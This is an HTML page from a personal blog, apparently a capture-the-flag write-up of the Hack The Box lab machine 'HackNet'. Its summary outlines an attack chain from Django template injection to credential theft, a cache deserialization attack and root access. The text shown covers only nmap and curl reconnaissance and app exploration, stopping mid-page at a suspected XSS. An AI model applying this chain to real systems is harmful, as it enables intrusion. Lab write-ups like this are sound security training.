@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — HackNet&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — HackNet">
+  
+    <meta name="description" content="HackNet is all about exploiting a Django application. It starts with a server-side template injection in the username. While getting RCE directly is not possible, it does allow leaking internal context variables, which includes credentials that can be reused for SSH login. Once on the box, I’ll find the Django cache directory is world-writable, which enables a deserialization attack to get to another user. From there, I’ll find private keys to decrypt several GPG-encrypted database dumps, one of which contains the root password.">
+    <meta property="og:description" content="HackNet is all about exploiting a Django application. It starts with a server-side template injection in the username. While getting RCE directly is not possible, it does allow leaking internal context variables, which includes credentials that can be reused for SSH login. Once on the box, I’ll find the Django cache directory is world-writable, which enables a deserialization attack to get to another user. From there, I’ll find private keys to decrypt several GPG-encrypted database dumps, one of which contains the root password.">
+  
+  
+    <meta property="og:image" content="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d131f54a035866ca64f0aff0a8e1fc14.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d131f54a035866ca64f0aff0a8e1fc14.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — HackNet</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Jan 18, 2026</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Linux">Linux</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/2d40b98a88f7807395ebf158be9d6d73" class="PageRoot"><h2 id="https://www.notion.so/2d40b98a88f781eda1a9e4eb87af2e71" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2d40b98a88f781eda1a9e4eb87af2e71"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h2><div id="https://www.notion.so/2d50b98a88f780c6b221f5b0e341020c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">HackNet is all about exploiting a Django application. It starts with a server-side template injection in the username. While getting RCE directly is not possible, it does allow leaking internal context variables, which includes credentials that can be reused for SSH login. Once on the box, I’ll find the Django cache directory is world-writable, which enables a deserialization attack to get to another user. From there, I’ll find private keys to decrypt several GPG-encrypted database dumps, one of which contains the root password.</span></span></p></div><div id="https://www.notion.so/2d40b98a88f781fbb5d4c55ab90f4c8a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2d40b98a88f781c38c4bece8f1a1a239" class="Divider"></div><h2 id="https://www.notion.so/2d40b98a88f781a2bf9feeb018c47c42" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2d40b98a88f781a2bf9feeb018c47c42"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h2><h3 id="https://www.notion.so/2d50b98a88f7801db09cdbca72c8b49f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f7801db09cdbca72c8b49f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Nmap:</span></span></h3><pre id="https://www.notion.so/2d50b98a88f780c2b7ddd3ad47b33431" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.232.4
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 03:54 ACDT
+Nmap scan report for 10.129.232.4
+Host is up (0.14s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 78.61 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 22,80 10.129.232.4
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 03:57 ACDT
+Nmap scan report for 10.129.232.4
+Host is up (0.14s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
+|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   140.70 ms 10.10.14.1
+2   140.47 ms 10.129.232.4
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f780f8833af4c0ccc8af9d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only SSH and HTTP are open. The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nmap</code></span><span class="SemanticString"> scan didn’t find too much information. </span></span></p></div><pre id="https://www.notion.so/2d50b98a88f780d49b8ded1dec5c4cdf" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/hacknet]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://10.129.232.4 -I
+
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.22.1
+Date: Tue, 23 Dec 2025 17:35:56 GMT
+Content-Type: text/html
+Content-Length: 169
+Connection: keep-alive
+Location: http://hacknet.htb/</span></span></span></code></pre><div id="https://www.notion.so/2d50b98a88f78002acd1ff567a2669c3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The web server is also redirecting to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hacknet.htb</code></span><span class="SemanticString">, I’ll add it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><h3 id="https://www.notion.so/2d50b98a88f780189ce1fe6632a3ba5d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f780189ce1fe6632a3ba5d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">TCP80 — HTTP:</span></span></h3><div id="https://www.notion.so/2d50b98a88f780eeb341ea94f60cb719" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_homepage.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_homepage.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f7802e8faee1719bb91beb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The site is a hacker forum. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.wappalyzer.com/">Wappalyzer</a></span><span class="SemanticString"> detected it’s a Django app.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78019a0fcdb6f0ba1435b" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_wappalyzer.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_wappalyzer.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780168cedd50c1da61067" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll register an account. On login, it shows my own profile.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78093866de9e03ee66e60" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_profile.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_profile.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780c2864ff634081158b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can submit new posts, which will appear on my profile afterwards.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78011b4eac70da9cddb0e" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_newpost.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_newpost.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780e7b7b5c8b73d0f2578" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can also edit my profile, which includes an option to upload a profile picture.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f7805ab0e2cc82f0a4d4c4" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_edit_profile.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_edit_profile.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780d38e43f05e4e7b4eba" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll upload an image for testing. Based on the response, it’s stored in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/media/test.png</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780bda532e38dff34376d" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_edit_response.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_edit_response.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780afa3afe2cd50ac82cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Uploading anything other than PNG and JPG would fail. Since it’s a Django app, this is probably a dead end even if the upload validation can be bypassed. It’s not like PHP where I can drop web shells directly for code execution.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780fbb07dca546b4cc625" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The username can also be changed. Interestingly it allows all sorts of special characters.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f7801c8e8be3f14c8c91a6" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_username_special_chars.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_username_special_chars.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780bc91a2cc765a2461f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This could potentially lead to XSS if the username is reflected in a page response somewhere with insufficient escaping/input sanitization.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f7806e815bfe8a035dd155" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s also a contacts tab, but nothing’s shown since I don’t have any.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780e1898ee17a8a53189d" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_contacts.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_contacts.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f7804da095dbd1c6146bca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar for messages.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78079b7ced942fcc58853" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_messages.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_messages.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h3 id="https://www.notion.so/2d50b98a88f78025a939cad0cc190811" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f78025a939cad0cc190811"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Search:</span></span></h3><div id="https://www.notion.so/2d50b98a88f780ca9c97d8fe8dfcd789" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_search.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_search.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f78081a95efd6590f88c4f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The search tab lists all users on the forum, top of the list is my account. I’ll checked several other users. Some are private:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78066be18f96111595ac1" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_private_profile.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_private_profile.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780d988c9fa2fb4cba69c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">While some are public:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780fab6afc864953bf44d" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_public_profile.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_public_profile.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780328e26f064cd264304" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can add them by clicking “Request contact”. On click, it changes to “Requested”.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78088b03ce311c51a8998" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s a messaging function as well.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78042bfe8c8d68ad1b5c9" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_message_textbox.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_message_textbox.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780b6a527d7a5298ca9c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A success message is shown after sending.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f7806bad93f9fda5bfbb25" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_message_success.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_message_success.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f78079a046d9a3c843cb69" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Out of curiosity, I created a second account and tried adding each other and sending messages between them, but nothing happened. I doubt the functionality is implemented at all.</span></span></p></div><h3 id="https://www.notion.so/2d50b98a88f7801d87b8c5b76d065fd4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2d50b98a88f7801d87b8c5b76d065fd4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Explore:</span></span></h3><div id="https://www.notion.so/2d50b98a88f78096ab47d3283d4b3dac" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_explore.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_explore.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780909b9adf9099ff0c7d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The Explore tab lists all posts users made, including the one I’ve created earlier. The posts are mainly about various hacks and vulnerabilities, but doesn’t seem related to the site itself.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f7806cb338c2c3b25240b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried commenting, but it didn’t allow me to.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f78041bb30cf6ac1c4ee21" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_comment_fail.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_comment_fail.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f7806ea859cce28c6dab0f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can like posts however. Clicking “likes” also shows the users who liked the post.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780768cb1d25faf7b5930" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_liked.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_liked.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780f1b6aef7677247aadc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Hovering over the profile pic shows its username.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f7809d8f8de7a27fe42290" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_hover_username.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_hover_username.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780ec9e5cfb09b6af6f37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When hovering over mine:</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780878ba2da4b7cb0b675" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_hover_cutoff.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_hover_cutoff.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780ca8d1bcdbab168a016" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">My username doesn’t fully render. The raw response gives a clearer picture.</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780fbb83df324d093cbb9" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_hover_burp.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/hacknet/web_hover_burp.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2d50b98a88f780bcb3bcda0bdbab1cdf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">That’s XSS!</span></span></p></div><div id="https://www.notion.so/2d50b98a88f780489e08e7f36dda22cd" class="ColorfulBlock 